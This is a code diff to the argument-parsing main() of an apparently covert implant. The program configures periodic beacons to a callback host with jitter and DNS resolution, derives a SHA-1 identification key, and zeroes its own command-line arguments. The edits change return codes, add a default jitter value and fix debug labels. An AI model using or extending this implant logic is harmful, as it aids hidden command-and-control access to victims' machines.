@@ -140,7 +140,7 @@ int main(int argc, char** argv)
 	// MAC address of ethernet interface(s)
 	if ( is_elevated_permissions() != SUCCESS ) {
 		fprintf(stderr,"%s", inp183Aq );
-		return -1;
+		return 1;
 	}
 
 	//initialize srand only once using the initSrandFlag...
@@ -199,6 +199,7 @@ int main(int argc, char** argv)
 		goto patched_binary;
 	} else {
 		beaconInfo.port = DEFAULT_BEACON_PORT;
+		beaconInfo.percentVariance = DEFAULT_BEACON_VARIANCE;
 	}
 	DLX(1, printf("NOTE: Binary was NOT/NOT patched with arguments\n\n"));
 
@@ -238,7 +239,7 @@ int main(int argc, char** argv)
 					beaconInfo.percentVariance = atoi(optarg) * 0.01f;
 				}
 				else {
-					beaconInfo.percentVariance = -1;
+					beaconInfo.percentVariance = 0;
 				}
 				break;
 
@@ -248,16 +249,16 @@ int main(int argc, char** argv)
 					if (ikey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
 //						fprintf(stderr, "Option error\n");
 						fprintf(stderr, "%s\n", oe1);
-						return -2;
+						return 2;
 					}
 
 					if (access(optarg, R_OK)) {
 						fprintf(stderr, "%s\n", oe2);
-						return -3;
+						return 3;
 					}
 					if (stat(optarg, &statbuf) != 0) {
 						perror("Option K");
-						return -3;
+						return 3;
 					}
 					if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { 			// Validate that the key text is of sufficient length
 						sha1_file((const char *)optarg, ikey);				// Generate the ID key
@@ -267,7 +268,7 @@ int main(int argc, char** argv)
 						DLX(1, printf("\n\n\n" ));
 					} else {
 						fprintf(stderr, "%s\n", oe3);
-						return -4;
+						return 4;
 					}
 					break;
 				}
@@ -279,12 +280,12 @@ int main(int argc, char** argv)
 				if (ikey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
 //					fprintf(stderr, "%s\n" "Option error");
 					fprintf(stderr, "%s\n", oe1);
-					return -2;
+					return 2;
 				}
 
 				if (strlen( optarg ) < ID_KEY_LENGTH_MIN) {
 					fprintf(stderr, "%s\n", oe3);
-            		return -4;
+            		return 4;
 				}
 				DLX(1, printf( "KeyPhrase: %s \n", optarg));
 				sha1((const unsigned char *)optarg, strlen(optarg), ikey);
@@ -303,7 +304,7 @@ int main(int argc, char** argv)
 					strcpy(sdcfp, optarg);				// Copy the path from the argument
 				} else {
 					fprintf(stderr, "%s\n", sde);
-					return -5;
+					return 5;
 				}
 				break;
 
@@ -317,20 +318,20 @@ int main(int argc, char** argv)
 					if ((dns = strtok(address_list, ","))) {
 						if (strlen(dns) > 16) {
 							fprintf(stderr, "%s\n", oe4);
-							return -6;
+							return 6;
 						}
 						memcpy(beaconInfo.dns[0], dns, strlen(dns));
 					} else {
 						beaconInfo.dns[0][0] = '\0';
 						fprintf(stderr, "%s\n", sdf);	// Parameter missing
-						return -7;
+						return 7;
 					}
 
 					// Get 2nd DNS server address if it was entered and validate its length
 					if ((dns = strtok(NULL, ","))) {
 						if (strlen(dns) > 16) {
 							fprintf(stderr, "%s\n", oe4);
-							return -6;
+							return 6;
 						}
 						memcpy(beaconInfo.dns[1], dns, strlen(dns));
 					} else
@@ -357,20 +358,26 @@ int main(int argc, char** argv)
 	}
 
 	// Process environment variables, if needed
-	
+	DL(4);
 	if (beaconInfo.initDelay > 0 && beaconInfo.interval == 0 ) {
 		DLX(1, printf("No Beacon Interval specified!\n"));
 		DLX(1, printUsage(argv[0]));
-		return -8;
+		return 8;
 	}
+
 	if  (beaconInfo.initDelay >= (INT_MAX-1)) {
 		DLX(1, printUsage(argv[0]));
-		return -9;
+		return 9;
+	}
+
+	if  (beaconInfo.percentVariance == 0) {
+		DLX(1, printUsage(argv[0]));
+		return 10;
 	}
 
 	if (ikey[0] == '\0') {
 		DLX(1, printUsage(argv[0]));
-		return -10;
+		return 11;
 	}
 
 	clean_args(argc, argv, NULL);	// Zero command line arguments
@@ -378,7 +385,7 @@ int main(int argc, char** argv)
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 patched_binary:	// Parsing of command line arguments skipped for patched binaries
-
+	DL(4);
 	if (beaconInfo.initDelay > 0) {			// Beacons enabled
 
 		if (beaconInfo.port == 0) {
@@ -389,13 +396,13 @@ patched_binary:	// Parsing of command line arguments skipped for patched binarie
 		if (beaconInfo.host == NULL) {	// At this point, the domain name or IP address appears in beaconInfo.host
 				DLX(1, printf("No Beacon IP address specified!\n"));
 				DLX(1, printUsage(argv[0]));
-				return -11;
+				return 12;
 		}
 
 		if (inet_pton(AF_INET, beaconInfo.host, &beaconIPaddr) <= 0) {		// Determine if beacon IP is a valid address
 			if (args.dns[0] == NULL && args.patched == 0) {					// If not, verify that a DNS server address was specified
 				DLX(1, printf("Beacon IP was specified as a domain name, but no valid DNS server address was specified to resolve the name!\n"));
-				return -12;
+				return 13;
 			}
 		}
 	}
@@ -435,9 +442,9 @@ patched_binary:	// Parsing of command line arguments skipped for patched binarie
 	printf("\t%32s: %-d\n", "Beacon Server Port", beaconInfo.port);
 	printf("\t%32s: %-s\n", "Primary DNS Server IP Address", beaconInfo.dns[0]);
 	printf("\t%32s: %-s\n", "Secondary DNS Server IP Address", beaconInfo.dns[1]);
-	printf("\t%32s: %-lu\n", "Initial Beacon Delay (sec)", beaconInfo.initDelay);
-	printf("\t%32s: %-i\n", "Initial Beacon Delay (sec)", beaconInfo.interval);
-	printf("\t%32s: %-f\n\n", "Initial Beacon Delay (sec)", beaconInfo.percentVariance);
+	printf("\t%32s: %-lu\n", "Initial Beacon Delay (sec)", beaconInfo.initDelay/1000);
+	printf("\t%32s: %-i\n", "Beacon Interval (sec)", beaconInfo.interval/1000);
+	printf("\t%32s: %-f\n\n", "Beacon Variance (%)", beaconInfo.percentVariance);
 #endif
 
 #ifndef DEBUG
